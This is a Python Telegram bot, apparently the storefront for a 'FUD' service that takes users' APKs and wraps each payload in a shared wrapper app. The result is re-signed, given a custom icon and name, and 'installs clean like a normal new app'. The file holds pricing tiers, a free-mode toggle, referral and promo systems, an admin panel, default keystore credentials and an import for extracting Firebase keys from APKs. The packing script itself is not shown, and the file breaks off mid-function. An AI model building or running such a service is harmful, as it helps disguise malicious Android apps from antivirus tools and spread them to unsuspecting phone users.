#!/usr/bin/env python3
"""hathixfud bot — FREE MODE edition.

  * FREE MODE: credit/quota system OFF — sab users unlimited free
  * admin panel: users, status, grant/revoke, pricing, welcome,
    payee, bot name, broadcast, DM, analytics + Free-Mode toggle

Runtime env (.env): BOT_TOKEN, OWNER_IDS, ADMIN_HANDLE, CHANNEL, CHANNEL_URL,
FREE_MODE, FORCE_JOIN.
"""
import asyncio
import io
import json
import logging
import os
import re
import shutil
import subprocess
import tempfile
import time
import zipfile
from datetime import datetime
from pathlib import Path

from dotenv import load_dotenv
from PIL import Image
from database import Database
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)
from telegram.request import HTTPXRequest

# KB integration
try:
    from kb_manager import KBManager
    from kb_analyzer import analyze_apk, extract_patterns_for_kb, extract_firebase_and_keys, format_firebase_report
    _KB_AVAILABLE = True
except ImportError:
    _KB_AVAILABLE = False

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
if not BOT_TOKEN:
    raise SystemExit("BOT_TOKEN is required at runtime. Add it to .env.")

BOT_USERNAME = os.getenv("BOT_USERNAME", "FreeFudBot").lstrip("@")

BASE_DIR = Path(os.getenv("BOT_DIR", "/root/.sop/hathixfud-bot"))
PROTECT = Path(os.getenv("PROTECT_SCRIPT", str(BASE_DIR / "protect_apk.py")))
PYTHON = os.getenv("BOT_PYTHON") or os.getenv("PYTHON") or ("python3" if os.name != "nt" else "python")
KEYSTORE = os.getenv("KEYSTORE", str(BASE_DIR / "keys" / "vida-key.jks"))
KEY_ALIAS = os.getenv("KEY_ALIAS", "vida")
KEY_PASS = os.getenv("KEY_PASS", "vida-key-pass")
MAX_MB = int(os.getenv("MAX_MB", "19"))
SESSION_TTL = int(os.getenv("SESSION_TTL", "600"))
FREE_LIMIT = int(os.getenv("FREE_LIMIT", "1"))
DATA_FILE = Path(os.getenv("DATA_FILE", str(BASE_DIR / "users.json")))

OWNER_IDS = [int(x) for x in os.getenv("OWNER_IDS", "8663496517").split(",") if x]
ADMIN_HANDLE = os.getenv("ADMIN_HANDLE", "@ShaileshXlive_Hunter")

# 🔓 FREE MODE flag (env + config override)
FREE_MODE = os.getenv("FREE_MODE", "true").strip().lower() in ("1", "true", "yes", "on")
FORCE_JOIN = os.getenv("FORCE_JOIN", "true").strip().lower() in ("1", "true", "yes", "on")

PLAN_7D_COST = os.getenv("PLAN_7D_COST", "$40")
PLAN_30D_COST = os.getenv("PLAN_30D_COST", "$100")
RATE_LIMIT_PER_HOUR = int(os.getenv("RATE_LIMIT_PER_HOUR", "999"))
ANTI_SPAM_WARNINGS = int(os.getenv("ANTI_SPAM_WARNINGS", "3"))
LIMITED_PLANS = [
    {"apks": 1, "price": "$3"},
    {"apks": 3, "price": "$14"},
    {"apks": 10, "price": "$25"},
]
UNLIMITED_PLANS = [
    {"days": 7, "price": "$40"},
    {"days": 14, "price": "$70"},
]

CHANNELS = [c.strip() for c in os.getenv("CHANNEL", "-1003770463666").split(",") if c.strip()]
CHANNEL_URLS = [u.strip() for u in os.getenv("CHANNEL_URL", "https://t.me/+6gzQXYSTRZtkZWRl").split(",") if u.strip()]

ADMIN_CHANNEL_ID = int(os.getenv("ADMIN_CHANNEL_ID", "-1003770463666"))

logging.basicConfig(format="%(asctime)s %(levelname)s %(name)s: %(message)s", level=logging.INFO)
logger = logging.getLogger("hathixfud-bot")
for _quiet_logger in ("httpx", "httpcore"):
    logging.getLogger(_quiet_logger).setLevel(logging.WARNING)

WAIT_ICON = 30
WAIT_NAME = 31

settings = {}
sessions = {}
_active = set()

_IMG_EXTS = {".png", ".jpg", ".jpeg", ".webp", ".bmp", ".gif"}
_APK_ICON_EXTS = {".png", ".webp", ".jpg", ".jpeg"}
_RESAMPLE = getattr(Image.Resampling, "LANCZOS", None) or getattr(Image, "LANCZOS")

# ----------------------------- persistence -----------------------------

def _load_json(path) -> dict:
    try:
        return json.loads(Path(path).read_text())
    except Exception:
        return {}


def _save_json(path, obj):
    try:
        tmp = Path(path).with_suffix(".tmp")
        tmp.write_text(json.dumps(obj, indent=1))
        tmp.replace(path)
    except Exception as e:
        logger.error("failed to save %s: %s", path, e)


DB_PATH = str(BASE_DIR / "hathixfud_bot.db")
db = Database(DB_PATH)
kb = KBManager(db) if _KB_AVAILABLE else None

db_user_count = db.count_users()
if db_user_count == 0 and DATA_FILE.exists():
    logger.info("Database empty, migrating from %s", DATA_FILE)
    migrated = db.migrate_from_json(str(DATA_FILE))
    if migrated > 0:
        logger.info("Migration complete: %d users imported", migrated)

USERS = db.get_all_users()

CONFIG_FILE = Path(os.getenv("CONFIG_FILE", str(BASE_DIR / "config.json")))
CONFIG = _load_json(CONFIG_FILE)

# config.json override for free mode
if "free_mode" in CONFIG:
    FREE_MODE = bool(CONFIG["free_mode"])

PLAN_7D_COST = CONFIG.get("plan7") or PLAN_7D_COST
PLAN_30D_COST = CONFIG.get("plan30") or PLAN_30D_COST

if CONFIG.get("plans"):
    LIMITED_PLANS = CONFIG["plans"].get("limited", LIMITED_PLANS)
    UNLIMITED_PLANS = CONFIG["plans"].get("unlimited", UNLIMITED_PLANS)

ADMINS = {int(x) for x in CONFIG.get("admins", []) if str(x).lstrip("-").isdigit()}


def _save_config():
    CONFIG["free_mode"] = FREE_MODE
    _save_json(CONFIG_FILE, CONFIG)


def _save_admins():
    CONFIG["admins"] = sorted(ADMINS)
    _save_config()


def _is_admin(chat_id) -> bool:
    return chat_id in OWNER_IDS or chat_id in ADMINS


def _payee() -> str:
    return CONFIG.get("payee") or ADMIN_HANDLE


def _bot_name() -> str:
    return CONFIG.get("botname") or "ཽ𝘍𝘙𝘌𝘌 𝘍𝘜𝘋 𝘉𝘖𝘛"


def _est_rev(active, p7="$30", p30="$100") -> int:
    def num(p):
        try:
            return float("".join(ch for ch in str(p) if ch.isdigit() or ch == ".").rstrip(".")) or 0
        except Exception:
            return 0
    n7, n30 = num(p7), num(p30)
    total = 0.0
    now = time.time()
    for u in active:
        days = (u.get("plan_until", 0) - now) / 86400
        if days >= 30:
            total += n30
        elif days >= 7:
            total += n7
        elif days > 0:
            total += n7 * days / 7
    return round(total)


# ----------------------------- users / quota -----------------------------


def _user(chat_id) -> dict:
    k = str(chat_id)
    if k not in USERS:
        USERS[k] = {"protected": 0, "plan_until": 0, "apks_left": 0, "name": "",
                    "history": [], "bonus_free": 0, "ref_count": 0, "ref_points": 0}
    return USERS[k]


def _is_owner(chat_id) -> bool:
    return _is_admin(chat_id)


def _has_access(chat_id) -> bool:
    """FREE MODE => everyone always has access."""
    if FREE_MODE:
        return not _is_blocked(chat_id)
    if _is_blocked(chat_id):
        return False
    if _is_owner(chat_id):
        return True
    u = _user(chat_id)
    if u["plan_until"] and u["plan_until"] > time.time():
        return True
    if u.get("apks_left", 0) > 0:
        return True
    return _free_left(chat_id) > 0


def _plan_left(chat_id) -> int:
    return max(0, int(_user(chat_id).get("plan_until", 0) - time.time()))


def _register_success(chat_id, name: str):
    u = _user(chat_id)
    u["protected"] += 1
    if name:
        u["name"] = name[:60]
    db.add_history(chat_id, time.time(), name[:60])
    db.trim_history(chat_id, keep=20)
    db.save_all_users(USERS)


def _is_blocked(chat_id) -> bool:
    return chat_id in _blocklist()


def _blocklist() -> set:
    return {int(x) for x in CONFIG.get("blocked", []) if str(x).lstrip("-").isdigit()}


def _save_blocklist(bl: set):
    CONFIG["blocked"] = sorted(bl)
    _save_config()


def _promos() -> dict:
    return CONFIG.setdefault("promos", {})


def _save_promos():
    _save_config()


def _ref_code(chat_id) -> str:
    u = _user(chat_id)
    if not u.get("ref"):
        u["ref"] = f"ref{abs(chat_id)}{int(time.time()) % 100000}"
        db.save_all_users(USERS)
    return u["ref"]


REF_PER_APK = 15


def _apply_referral(chat_id, ref: str) -> bool:
    ref = (ref or "").strip()
    if not ref or len(ref) > 40:
        return False
    u = _user(chat_id)
    if u.get("referred_by"):
        return False
    for uid, rec in USERS.items():
        if rec.get("ref") == ref and str(uid) != str(chat_id):
            rr = _user(int(uid))
            rr["ref_count"] = int(rr.get("ref_count", 0)) + 1
            rr["ref_points"] = int(rr.get("ref_points", 0)) + 1
            u["referred_by"] = str(uid)
            db.save_all_users(USERS)
            return True
    return False


def _free_left(chat_id) -> int:
    u = _user(chat_id)
    bonus = int(u.get("bonus_free", 0))
    pts = int(u.get("ref_points", 0)) // REF_PER_APK
    return max(0, FREE_LIMIT + bonus + pts - int(u.get("protected", 0)))


# ----------------------------- helpers -----------------------------

def _ensure_settings(chat_id):
    if chat_id not in settings:
        settings[chat_id] = {"fresh": False}
    return settings[chat_id]


def _is_image_doc(doc) -> bool:
    name = (doc.file_name or "").lower()
    mime = (doc.mime_type or "").lower()
    return mime.startswith("image/") or Path(name).suffix in _IMG_EXTS


def _extract_apk_icon(apk_path: Path, output_path: Path) -> Path | None:
    candidates = []
    try:
        with zipfile.ZipFile(apk_path) as apk:
            for info in apk.infolist():
                name = info.filename
                lower = name.lower()
                path = Path(name)
                if not lower.startswith(("res/mipmap", "res/drawable")):
                    continue
                if path.suffix.lower() not in _APK_ICON_EXTS:
                    continue
                base = path.stem.lower()
                if any(part in base for part in ("foreground", "background", "notification")):
                    continue
                score = 0
                if "mipmap" in lower:
                    score += 100
                if "launcher" in base:
                    score += 80
                if "icon" in base:
                    score += 60
                if "logo" in base:
                    score += 30
                score += min(info.file_size, 512 * 1024) / 1000000
                candidates.append((score, info))
            if not candidates:
                return None
            _, selected = max(candidates, key=lambda item: item[0])
            raw = apk.read(selected)
        image = Image.open(io.BytesIO(raw)).convert("RGBA")
        width, height = image.size
        if not width or not height:
            return None
        side = min(width, height)
        image = image.crop(((width - side) // 2, (height - side) // 2,
                            (width + side) // 2, (height + side) // 2))
        image = image.resize((512, 512), _RESAMPLE)
        image.save(output_path, format="PNG")
        return output_path
    except Exception as exc:
        logger.warning("could not extract APK icon from %s: %s", apk_path, exc)
        return None


async def _reply(update: Update, text: str, kb=None):
    await update.effective_message.reply_text(text, parse_mode="HTML",
                                             reply_markup=kb)


# ----------------------------- channel gate -----------------------------

ALLOWED_MEMBER_STATES = ("creator", "administrator", "member")

JOIN_MSG = (
    "🔒 <b>Members only</b>\n"
    "To use this bot, please join this channel first:\n\n"
    + "\n".join(f"👉 <b>{ch}</b>" for ch in CHANNELS) +
    "\n\nTap the button below, join, then come back and hit <b>✅ I joined</b>."
)


def _join_kb() -> InlineKeyboardMarkup:
    btns = []
    for i, url in enumerate(CHANNEL_URLS):
        btns.append([InlineKeyboardButton(f"📢 Join channel {i+1}", url=url)])
    btns.append([InlineKeyboardButton("✅ I joined", callback_data="chk_channel")])
    return InlineKeyboardMarkup(btns)


async def _is_member(bot, user_id) -> bool:
    if not FORCE_JOIN or not CHANNELS:
        return True
    for ch in CHANNELS:
        try:
            m = await bot.get_chat_member(chat_id=ch, user_id=user_id)
            if m.status not in ALLOWED_MEMBER_STATES:
                return False
        except Exception as e:
            logger.warning("channel check failed for %s (user %s): %s", ch, user_id, e)
            # If channel check fails and free mode - allow through
            return FREE_MODE
    return True


# ----------------------------- main keyboard -----------------------------

def _main_kb(is_owner: bool = False) -> InlineKeyboardMarkup:
    btn = [
        [InlineKeyboardButton("📦 Protect my APK", callback_data="send_apk")],
        [InlineKeyboardButton("💰 View plans", callback_data="plans_btn"),
         InlineKeyboardButton("🔧 My account", callback_data="status_btn")],
        [InlineKeyboardButton("📜 My history", callback_data="hist_btn"),
         InlineKeyboardButton("🎁 Refer & earn", callback_data="refer_btn")],
        [InlineKeyboardButton("🛟 Support", callback_data="support_btn")],
    ]
    if is_owner:
        btn.append([InlineKeyboardButton("🛡 Admin Panel", callback_data="admin_btn")])
    return InlineKeyboardMarkup(btn)


def _with_back(kb: InlineKeyboardMarkup) -> InlineKeyboardMarkup:
    rows = list(kb.inline_keyboard)
    rows.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
    return InlineKeyboardMarkup(rows)


def _back_only() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]])


# ----------------------------- public commands -----------------------------

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    if _is_blocked(uid):
        await _reply(update, "⛔ You are blocked from using this bot. "
                             f"Contact {_payee()} if you think this is a mistake.")
        return
    if not await _is_member(ctx.bot, uid):
        await _reply(update, JOIN_MSG, kb=_join_kb())
        return
    args = ctx.args or []
    if args:
        ref = re.sub(r"[^A-Za-z0-9]", "", args[0])
        if ref and _apply_referral(uid, ref):
            await _reply(update, "🎁 <b>Referral bonus applied!</b> You got <b>+1 bonus free APK</b>.")
    ru = _user(uid)
    if not ru.get("joined"):
        ru["joined"] = time.time()
        db.save_all_users(USERS)
    await update.effective_message.reply_text(await _welcome_text(update), parse_mode="HTML",
                                             reply_markup=_main_kb(_is_owner(uid)))


async def _welcome_text(update: Update) -> str:
    uid = update.effective_chat.id
    u = _user(uid)
    first = (update.effective_user.first_name or "friend").replace("<", "&lt;").replace(">", "&gt;")
    custom = CONFIG.get("welcome")
    if custom:
        txt = custom.replace("{first}", first)
    else:
        txt = (
            f"🎉 <b>Welcome, {first}!</b> 🎉\n"
            f"━━━━━━━━━━━━━━━\n"
            f"<b>{_bot_name()}</b>\n"
            f"Turn any <code>.apk</code> into a <b>fully protected app</b>"
            f" — in one tap.\n\n"
            f"✨ <b>What you get:</b>\n"
            f"🔒 <b>Protected</b> — your APK payload is packaged securely\n"
            f"🛡 <b>Validated</b> — integrity and signing checks are applied\n"
            f"🖼 <b>Your icon</b> — set your own app icon (or skip for default)\n"
            f"📲 <b>Installs clean</b> — like a normal new app\n\n"
            f"🎁 <b>BONUS:</b> every new user gets <b>1 FREE</b> protection!\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📦 <b>Limited:</b> $3/1apk · $14/3apk · $25/10apk\n"
            f"♾️ <b>Unlimited:</b> $40/7d · $70/14d\n"
            f"━━━━━━━━━━━━━━━\n"
            f"Ready? Tap a button below 👇"
        )

    # FREE MODE banner
    if FREE_MODE:
        txt = (
            f"🎉 <b>Welcome, {first}!</b> 🎉\n"
            f"━━━━━━━━━━━━━━━\n"
            f"<b>{_bot_name()}</b>\n"
            f"🔓 <b>FREE MODE ACTIVE</b> — unlimited APKs, no credits, no payment!\n"
            f"━━━━━━━━━━━━━━━\n"
            f"✨ <b>What you get:</b>\n"
            f"🔒 <b>Protected</b> — your APK payload is packaged securely\n"
            f"🛡 <b>Validated</b> — integrity and signing checks applied\n"
            f"🖼 <b>Your icon</b> — set your own (or skip for default)\n"
            f"📲 <b>Installs clean</b> — like a normal new app\n"
            f"♾️ <b>Unlimited builds</b> — no limits, no credit system\n"
            f"━━━━━━━━━━━━━━━\n"
            f"Ready? Tap <b>📦 Protect my APK</b> below 👇"
        )

    if _is_owner(uid):
        txt += "\n\n🛡 <b>Admin mode:</b> unlimited access"
    elif not FREE_MODE:
        if _plan_left(uid) > 0:
            txt += f"\n\n⏳ Plan active: <b>{_plan_left(uid) // 86400}d</b> left."
        elif _free_left(uid) > 0:
            txt += f"\n\n🎁 You still have <b>{_free_left(uid)}</b> free APK(s) — use them!"
        else:
            txt += ("\n\n❄️ <b>Free trial used.</b> "
                    f"Tap <b>💰 View plans</b> → pay {_payee()} to continue.")
    return txt


async def chk_channel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = update.effective_chat.id
    if await _is_member(ctx.bot, uid):
        await q.edit_message_text(
            await _welcome_text(update),
            parse_mode="HTML",
            reply_markup=_main_kb(_is_owner(uid)),
        )
    else:
        await q.edit_message_text(JOIN_MSG, parse_mode="HTML",
                                  reply_markup=_join_kb())


async def help_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await start(update, ctx)


async def plans_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if FREE_MODE:
        await _reply(
            update,
            f"🔓 <b>FREE MODE ACTIVE</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"<b>No payment needed.</b> All APK builds are 100% free and unlimited.\n\n"
            f"Just send an APK → get a protected APK back. ✅\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🎁 BONUS: new users get a free build instantly.",
            kb=_with_back(_main_kb(_is_owner(update.effective_chat.id))),
        )
        return
    lines = [f"💰 <b>{_bot_name()} — PLANS</b>", "─────", ""]
    lines.append("📦 <b>Limited (pay per APK):</b>")
    for p in LIMITED_PLANS:
        lines.append(f"  • <b>{p['price']}</b> → {p['apks']} APK{'s' if p['apks'] > 1 else ''}")
    lines.append("")
    lines.append("♾️ <b>Unlimited (pay for time):</b>")
    for p in UNLIMITED_PLANS:
        lines.append(f"  • <b>{p['price']}</b> → {p['days']} days")
    lines.append("─────")
    lines.append(f"Pay {_payee()} and send the proof — then you're "
                 f"activated (your ID: <code>{update.effective_chat.id}</code>).")
    await _reply(
        update,
        "\n".join(lines),
        kb=_with_back(_main_kb(_is_owner(update.effective_chat.id))),
    )


async def fresh_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    arg = (ctx.args[0] if ctx.args else "").lower()
    if arg in ("off", "no", "0", "false"):
        s = _ensure_settings(update.effective_chat.id)
        s["fresh"] = False
        msg = "✅ Fresh package: <b>OFF</b>"
    elif arg in ("on", "yes", "1", "true"):
        msg = ("⚠️ <b>Disabled</b>: fresh-package relabel broke the launcher. "
               "All builds now use the shared wrapper package.")
    else:
        msg = "Usage: /fresh off"
    await _reply(update, msg)


async def status_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    u = _user(chat_id)
    try:
        free_df = shutil.disk_usage("/root")
        disk_free = free_df.free // (1024**3)
    except Exception:
        disk_free = 0

    if FREE_MODE:
        quota = "🔓 FREE MODE — unlimited"
    elif _is_owner(chat_id):
        paying = [x for x in USERS.values() if x.get("plan_until", 0) > time.time()]
        quota = (f"♾️ Unlimited (admin) · 👥 {len(USERS)} users · "
                 f"💳 {len(paying)} paying")
    elif _plan_left(chat_id) > 0:
        quota = f"⏳ Unlimited plan — {_plan_left(chat_id) // 86400}d left"
    elif u.get("apks_left", 0) > 0:
        quota = f"📦 Limited plan — {u['apks_left']} APK(s) remaining"
    else:
        quota = f"🎁 Free APKs used: {u['protected']}/{FREE_LIMIT}"

    await _reply(
        update,
        f"🔧 <b>Your status</b>\n"
        f"• quota: {quota}\n"
        f"• free mode: <b>{'ON' if FREE_MODE else 'OFF'}</b>\n"
        f"• package: <b>shared wrapper</b>\n"
        f"• busy jobs: {len(_active)}\n"
        f"• server disk free: {disk_free} GB",
        kb=_back_only(),
    )


# ----------------------------- user features -----------------------------

async def history_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    u = _user(uid)
    hist = db.get_history(uid, limit=10)
    if not hist:
        await _reply(update, "📜 No protected APKs yet. Protect your first one with "
                             "<code>/start</code> → <b>Protect my APK</b>.")
        return
    lines = ["📜 <b>Your protection history</b>"]
    for h in reversed(hist):
        d = datetime.utcfromtimestamp(h["ts"]).strftime("%d %b %Y") if h.get("ts") else "—"
        nm = h.get("name") or "—"
        lines.append(f"• <b>{d}</b> — {nm}")
    lines.append("")
    lines.append(f"Total protected: <b>{u.get('protected', 0)}</b> APKs")
    await _reply(update, "\n".join(lines))


async def refer_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    code = _ref_code(uid)
    link = f"https://t.me/{BOT_USERNAME}?start={code}"
    u = _user(uid)
    pts = int(u.get("ref_points", 0))
    earned = pts // REF_PER_APK
    await _reply(
        update,
        f"🎁 <b>Refer & earn</b>\n"
        f"Refer <b>{REF_PER_APK} friends</b> and get <b>1 free APK</b>!\n\n"
        f"🔗 <code>{link}</code>\n\n"
        f"👥 Referrals: <b>{pts}/{REF_PER_APK}</b>\n"
        f"🎁 Free APKs earned: <b>{earned}</b>\n"
        f"🆓 Each new user also gets <b>+1 bonus free APK</b> instantly.",
        kb=_back_only(),
    )


async def redeem_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    args = ctx.args
    if not args:
        await _reply(update, "Usage: <code>/redeem CODE</code>")
        return
    code = args[0].strip().upper()
    promos = _promos()
    if code not in promos:
        await _reply(update, "❌ Invalid or expired promo code.")
        return
    p = promos[code]
    if p.get("used", 0) >= int(p.get("max", 1)):
        await _reply(update, "❌ That promo code has been fully redeemed.")
        return
    u = _user(update.effective_chat.id)
    if u.get("redeemed", "").count(code):
        await _reply(update, "ℹ️ You already redeemed this code.")
        return
    days = int(p.get("days", 1))
    base = max(u.get("plan_until", 0), time.time())
    u["plan_until"] = int(base) + days * 86400
    u["redeemed"] = (u.get("redeemed") or "") + code + ","
    p["used"] = int(p.get("used", 0)) + 1
    _save_promos()
    db.save_all_users(USERS)
    until = datetime.utcfromtimestamp(u["plan_until"]).strftime("%Y-%m-%d %H:%M UTC")
    await _reply(update, f"✅ Promo applied! +{days}d premium → active until {until} UTC.")


async def gift_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    if not FREE_MODE and _plan_left(uid) <= 0 and not _is_owner(uid):
        await _reply(update, "🔒 <b>Gifting premium</b> is for active premium users. "
                             f"Subscribe first — pay {_payee()}.")
        return
    args = ctx.args
    if len(args) < 2 or not args[0].lstrip("-").isdigit() or not args[1].isdigit():
        await _reply(update, "Usage: <code>/gift &lt;telegram_id&gt; &lt;days&gt;</code>")
        return
    target, days = str(int(args[0])), int(args[1])
    if days < 1 or days > 365:
        await _reply(update, "days must be 1–365.")
        return
    u = _user(int(target))
    base = max(u.get("plan_until", 0), time.time())
    u["plan_until"] = int(base) + days * 86400
    db.save_all_users(USERS)
    until = datetime.utcfromtimestamp(u["plan_until"]).strftime("%Y-%m-%d %H:%M UTC")
    try:
        await ctx.bot.send_message(
            chat_id=int(target),
            text=f"🎁 <b>You received a gift!</b>\nSomeone gifted you <b>{days}d</b> "
                 f"premium → active until {until} UTC.",
            parse_mode="HTML")
    except Exception:
        pass
    await _reply(update, f"✅ Gifted {days}d premium to <code>{target}</code> (until {until} UTC).")


async def resume_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    s = sessions.get(chat_id)
    if not s:
        await _reply(update, "ℹ️ You have no pending protection. Send your <code>.apk</code> to start.")
        return
    if s.get("active"):
        await _reply(update, "⚙️ Your APK is currently being protected. It'll arrive shortly.")
    elif not s.get("label"):
        await _reply(update, "📛 We were waiting for the <b>app name</b>. Send it (max 23 letters) "
                             "or <code>/skip</code>.")
    elif not s.get("icon"):
        await _reply(update, "🖼 We were waiting for the <b>app icon</b>. Send a square photo or PNG.")
    else:
        await _reply(update, "🔧 We were at the final step. Send <code>/cancel</code> to reset.")


async def support_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await _reply(
        update,
        f"🛟 <b>Support</b>\n"
        f"For help or issues, message <b>{_payee()}</b> directly.\n\n"
        f"ℹ️ Free Mode is active — no payment needed for APK protection.",
        kb=_back_only(),
    )


async def lang_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await _reply(update, "🌐 <b>Language</b>\nEnglish only for now.", kb=_back_only())


async def dash_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_owner(update.effective_chat.id):
        await _reply(update, "⛔ Admins only.")
        return
    now = time.time()
    today = now - 86400
    total = len(USERS)
    new_today = sum(1 for u in USERS.values() if (u.get("joined") or 0) >= today)
    protects = db.total_protected()
    prot_today = db.count_protected_today(today)
    paying = [u for u in USERS.values() if u.get("plan_until", 0) > now]
    limited = [u for u in USERS.values() if u.get("apks_left", 0) > 0]
    lines = [
        "📊 <b>DASHBOARD</b>",
        f"🔓 Free mode: <b>{'ON' if FREE_MODE else 'OFF'}</b>",
        f"👥 Users: <b>{total}</b> (➕{new_today} today)",
        f"🎁 APKs protected: <b>{protects}</b> (🔥{prot_today} today)",
        f"♾️ Unlimited users: <b>{len(paying)}</b>",
        f"📦 Limited users: <b>{len(limited)}</b>",
        f"⛔ Blocked: <b>{len(_blocklist())}</b>",
        f"🏦 Promo codes: <b>{len(_promos())}</b>",
    ]
    await _reply(update, "\n".join(lines))


# ----------------------------- buttons -----------------------------

async def btn_send_apk(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    chat_id = update.effective_chat.id
    if not await _is_member(ctx.bot, chat_id):
        await q.edit_message_text(JOIN_MSG, reply_markup=_join_kb())
        return
    if _has_access(chat_id):
        await q.edit_message_text(
            "📤 <b>Send your APK now</b>\n"
            "Just attach the <code>.apk</code> file below 👇\n"
            "(it's a document — not a photo)",
        )
    else:
        await q.edit_message_text(
            f"❗ <b>Free trial used up</b>\n"
            f"Pay <b>{_payee()}</b> to unlock:\n\n"
            f"📦 <b>Limited:</b> $3/1apk · $14/3apk · $25/10apk\n"
            f"♾️ <b>Unlimited:</b> $40/7d · $70/14d\n\n"
            f"Your ID: <code>{chat_id}</code>",
            reply_markup=_with_back(_main_kb(_is_owner(chat_id))),
        )


async def btn_plans(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await plans_cmd(update, ctx)


async def btn_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await status_cmd(update, ctx)


async def btn_history(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await history_cmd(update, ctx)


async def btn_refer(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await refer_cmd(update, ctx)


async def btn_support(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await support_cmd(update, ctx)


# ----------------------------- admin panel -----------------------------

ADMIN_PENDING = {}


def _admin_kb() -> InlineKeyboardMarkup:
    free_label = f"{'🟢' if FREE_MODE else '🔴'} FREE MODE: {'ON' if FREE_MODE else 'OFF'}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(free_label, callback_data="ap_toggle_free")],
        [InlineKeyboardButton("📊 Analytics", callback_data="ap_analytics"),
         InlineKeyboardButton("👥 Users", callback_data="ap_users")],
        [InlineKeyboardButton("👤 User Info", callback_data="ap_userinfo"),
         InlineKeyboardButton("🔧 Server status", callback_data="ap_status")],
        [InlineKeyboardButton("💳 Payee", callback_data="ap_payee"),
         InlineKeyboardButton("📢 Force join", callback_data="ap_forcejoin")],
        [InlineKeyboardButton("🏦 Admins", callback_data="ap_admins")],
        [InlineKeyboardButton("⛔ Blacklist", callback_data="ap_blist"),
         InlineKeyboardButton("🎫 Promo codes", callback_data="ap_promos")],
        [InlineKeyboardButton("🎖 Grant premium", callback_data="ap_grant"),
         InlineKeyboardButton("🚫 Revoke", callback_data="ap_revoke")],
        [InlineKeyboardButton("💰 Set pricing", callback_data="ap_price"),
         InlineKeyboardButton("✏️ Bot name", callback_data="ap_botname")],
        [InlineKeyboardButton("💬 Edit welcome", callback_data="ap_welcome")],
        [InlineKeyboardButton("📚 KB Status", callback_data="ap_kb"),
         InlineKeyboardButton("📚 Train KB", callback_data="ap_train")],
        [InlineKeyboardButton("📢 Broadcast all", callback_data="ap_broadcast"),
         InlineKeyboardButton("📩 Message 1 user", callback_data="ap_dm")],
        [InlineKeyboardButton("🔙 ← Main menu", callback_data="back_main")],
    ])


def _admin_menu_text() -> str:
    paying = [u for u in USERS.values() if u.get("plan_until", 0) > time.time()]
    limited = [u for u in USERS.values() if u.get("apks_left", 0) > 0]
    blocked = len(_blocklist())

    kb_line = ""
    if kb:
        try:
            kb_stats = kb.get_stats()
            kb_line = f"\n📚 KB: <code>{kb_stats['total']}</code> patterns"
        except Exception:
            kb_line = "\n📚 KB: <code>unavailable</code>"
    else:
        kb_line = "\n📚 KB: <code>disabled</code>"

    free_line = f"🔓 <b>FREE MODE: {'ON ✅' if FREE_MODE else 'OFF ❌'}</b>\n"

    return (
        f"🛡 <b>{_bot_name()} · ADMIN PANEL</b>\n"
        f"{free_line}"
        f"👥 Users: <code>{len(USERS)}</code> • ♾️ unlimited: <code>{len(paying)}</code> • 📦 limited: <code>{len(limited)}</code>\n"
        f"💳 payee: {_payee()} • ⛔ blocked: <code>{blocked}</code>\n"
        f"📢 force join: <code>{CHANNELS[0] if CHANNELS else 'off'}</code> • 💬 welcome: "
        f"{'<b>custom</b>' if CONFIG.get('welcome') else '<b>default</b>'}"
        f"{kb_line}\n"
        "━━━━━━━━━━━━━━━\n"
        "Choose a management tool 👇"
    )


def _users_summary() -> str:
    if not USERS:
        return "👥 No users yet."
    now = time.time()
    owners = OWNER_IDS
    admins = ADMINS
    total = len(USERS)
    paying = sum(1 for u in USERS.values() if u.get("plan_until", 0) > now)
    limited = sum(1 for u in USERS.values() if u.get("apks_left", 0) > 0)
    free = total - paying - limited
    total_apks = sum(u.get("protected", 0) for u in USERS.values())
    lines = [
        f"👥 <b>USERS DASHBOARD</b>",
        f"━━━━━━━━━━━━━━━",
        f"📊 <b>Total:</b> <code>{total}</code> • ♾️ <b>Unlimited:</b> <code>{paying}</code> • 📦 <b>Limited:</b> <code>{limited}</code> • 🆓 <b>Free:</b> <code>{free}</code>",
        f"📦 <b>Total APKs protected:</b> <code>{total_apks}</code>",
        f"🔓 <b>Free Mode:</b> <code>{'ON' if FREE_MODE else 'OFF'}</code>",
        f"━━━━━━━━━━━━━━━",
    ]
    def _tag(uid: str) -> str:
        i = int(uid)
        if i in owners:
